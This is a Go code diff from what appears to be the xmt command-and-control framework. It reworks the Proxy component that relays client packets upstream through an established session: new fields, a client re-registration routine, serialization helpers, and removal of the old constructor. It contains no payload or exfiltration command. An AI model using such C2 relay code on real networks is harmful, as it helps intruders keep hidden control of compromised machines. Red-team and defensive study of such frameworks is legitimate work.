@@ -1,3 +1,5 @@
+//go:build !noproxy
+
 package c2
 
 import (
@@ -9,25 +11,33 @@ import (
 
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/com"
+	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/util"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
-	"github.com/iDigitalFlame/xmt/util/xerr"
+)
+
+var (
+	_ connServer = (*Proxy)(nil)
+	_ connHost   = (*proxyClient)(nil)
 )
 
 // Proxy is a struct that controls a Proxied connection between a client and a
 // server and allows for packets to be routed through a current established
 // Session.
 type Proxy struct {
-	listener net.Listener
+	lock sync.RWMutex
 	connection
 
-	clients map[uint32]*proxyClient
-	ch      chan struct{}
-	close   chan uint32
-	parent  *Session
-	cancel  context.CancelFunc
+	listener net.Listener
+	f        func()
+	ch       chan struct{}
+	close    chan uint32
+	parent   *Session
+	cancel   context.CancelFunc
+	clients  map[uint32]*proxyClient
 
-	lock  sync.RWMutex
+	addr  string
 	state state
 }
 type proxyClient struct {
@@ -53,7 +63,7 @@ func (p *Proxy) prune() {
 			p.lock.RLock()
 			if _, ok := p.clients[i]; ok {
 				if delete(p.clients, i); cout.Enabled {
-					p.log.Info("[%s/Proxy] Removed closed Session 0x%X.", p.parent.ID, i)
+					p.log.Info("[%s/P] Removed closed Session 0x%X.", p.parent.ID, i)
 				}
 			}
 			p.lock.RUnlock()
@@ -62,7 +72,7 @@ func (p *Proxy) prune() {
 }
 func (p *Proxy) listen() {
 	if cout.Enabled {
-		p.log.Info("[%s/Proxy] Starting listen on %q..", p.parent.ID, p.listener)
+		p.log.Info("[%s/P] Starting listen on %q..", p.parent.ID, p.listener)
 	}
 	go p.prune()
 	for {
@@ -86,7 +96,7 @@ func (p *Proxy) listen() {
 			if cout.Enabled {
 				p.parent.log.Error("[%s/P] Error during Listener accept: %s!", p.parent.ID, err)
 			}
-			if ok && !e.Timeout() && !e.Temporary() {
+			if ok && !e.Timeout() {
 				break
 			}
 			continue
@@ -114,6 +124,8 @@ func (p *Proxy) listen() {
 	p.parent.proxy = nil
 	p.parent = nil
 	close(p.ch)
+	p.f()
+	p.f = nil
 }
 func (p *Proxy) clientLock() {
 	p.lock.RLock()
@@ -148,6 +160,13 @@ func (c *proxyClient) Close() {
 	c.peek = nil
 }
 func (p *Proxy) clientUnlock() {
+	p.lock.RUnlock()
+}
+func (p *Proxy) subsRegister() {
+	p.lock.RLock()
+	for _, v := range p.clients {
+		v.queue(&com.Packet{ID: SvRegister, Job: uint16(util.FastRand()), Device: v.ID})
+	}
 	p.lock.RUnlock()
 }
 
@@ -329,55 +348,15 @@ func (c *proxyClient) next(i bool) *com.Packet {
 func (c *proxyClient) sender() chan *com.Packet {
 	return c.send
 }
-
-// Proxy establishes a new listening Proxy connection using the supplied Profile
-// that will send any received Packets "upstream" via the current Session.
-//
-// Packets destined for hosts connected to this proxy will be routed back and
-// forth on this Session.
-//
-// This function will return an error if this is not a client Session or
-// listening fails.
-func (s *Session) Proxy(p Profile) (*Proxy, error) {
-	if s.parent != nil {
-		return nil, xerr.Sub("must be a client session", 0x5)
-	}
-	// TODO(dij): Eventually this will be removed :P
-	if s.proxy != nil {
-		return nil, xerr.Sub("only a single Proxy per session can be active", 0x2)
-	}
-	if p == nil {
-		return nil, ErrInvalidProfile
-	}
-	h, w, t := p.Next()
-	if len(h) == 0 {
-		return nil, ErrNoHost
-	}
-	l, err := p.Listen(s.ctx, h)
-	if err != nil {
-		return nil, xerr.Wrap("unable to listen", err)
-	}
-	if l == nil {
-		return nil, xerr.Sub("unable to listen", 0x8)
-	}
-	v := &Proxy{
-		ch:         make(chan struct{}, 1),
-		close:      make(chan uint32, 8),
-		parent:     s,
-		clients:    make(map[uint32]*proxyClient),
-		listener:   l,
-		connection: connection{s: s.s, p: p, w: w, m: s.m, t: t, log: s.log},
-	}
-	if v.ctx, v.cancel = context.WithCancel(s.ctx); cout.Enabled {
-		s.log.Info("[%s/P] Added Proxy Listener on %q!", s.ID, h)
-	}
-	s.proxy = v
-	go v.listen()
-	return v, nil
-}
 func (p *Proxy) clientGet(i uint32) (connHost, bool) {
 	v, ok := p.clients[i]
 	return v, ok
+}
+func (p proxyData) MarshalStream(w data.Writer) error {
+	if err := w.WriteString(p.n); err != nil {
+		return err
+	}
+	return w.WriteString(p.b)
 }
 func (p *Proxy) clientSet(i uint32, c chan *com.Packet) {
 	v, ok := p.clients[i]
@@ -457,6 +436,40 @@ func (p *Proxy) talk(a string, n *com.Packet) (*conn, error) {
 		return nil, err
 	}
 	return v, nil
+}
+func readProxyInfo(r io.Reader, d *[8]byte) ([]proxyData, error) {
+	if err := readFull(r, 1, (*d)[0:1]); err != nil {
+		return nil, err
+	}
+	m := int((*d)[0])
+	if m == 0 {
+		return nil, nil
+	}
+	var (
+		o   = make([]proxyData, m)
+		err error
+	)
+	for i := 0; i < m && i < 0xFF; i++ {
+		if err = readFull(r, 4, (*d)[0:4]); err != nil {
+			return nil, err
+		}
+		n, s := make([]byte, uint16((*d)[1])|uint16((*d)[0])<<8), make([]byte, uint16((*d)[3])|uint16((*d)[2])<<8)
+		if len(n) > 0 {
+			if err = readFull(r, len(n), n); err != nil {
+				return nil, err
+			}
+		}
+		if len(s) > 0 {
+			if err = readFull(r, len(s), s); err != nil {
+				return nil, err
+			}
+		}
+		if o[i].p, err = readSlice(r, d); err != nil {
+			return nil, err
+		}
+		o[i].b, o[i].n = string(n), string(s)
+	}
+	return o, nil
 }
 func (p *Proxy) resolve(s *proxyClient, a string, t []uint32) (*conn, error) {
 	if len(t) == 0 {
